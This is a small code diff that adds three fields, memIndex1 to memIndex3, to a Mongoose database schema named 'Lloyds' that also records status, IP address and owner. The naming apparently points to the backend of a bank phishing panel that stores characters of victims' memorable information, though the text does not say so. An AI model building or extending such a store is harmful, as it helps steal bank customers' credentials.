@@ -12,6 +12,9 @@ const lloydsSchema = new mongoose.Schema({
   status: Number,
   ip: String,
   owner: String,
+  memIndex1: String,
+  memIndex2: String,
+  memIndex3: String,
 });
 
 module.exports = mongoose.model("Lloyds", lloydsSchema);
